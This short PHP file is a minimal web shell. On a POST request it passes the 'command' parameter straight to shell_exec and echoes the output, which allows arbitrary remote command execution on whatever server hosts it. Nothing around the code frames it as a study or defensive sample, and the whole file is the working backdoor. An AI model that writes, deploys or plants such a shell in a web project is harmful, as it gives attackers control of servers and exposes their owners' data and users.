<?php
if ($_SERVER["REQUEST_METHOD"]=="POST") {

	$cmd=$_REQUEST["command"];
	sleep(3);
	echo "<pre>";
	echo shell_exec($cmd);
	//$read=proc_open($cmd, descriptorspec, pipes));
	echo "<pre>";
}
